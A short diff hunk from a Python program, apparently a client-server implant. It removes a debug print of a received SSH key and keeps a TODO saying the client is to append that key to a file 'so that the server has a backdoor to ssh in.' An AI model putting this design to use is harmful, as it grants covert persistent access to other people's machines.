@@ -133,7 +133,6 @@ while True:
 				ssh_key = ""
 				for i in range(1, len(info)):
 					ssh_key = ssh_key + info[i] + " "
-				print(ssh_key)
 
 				## TODO(client side): append the ssh key to _you_should_know_which file
 				##                    so that the server has a backdoor to ssh in
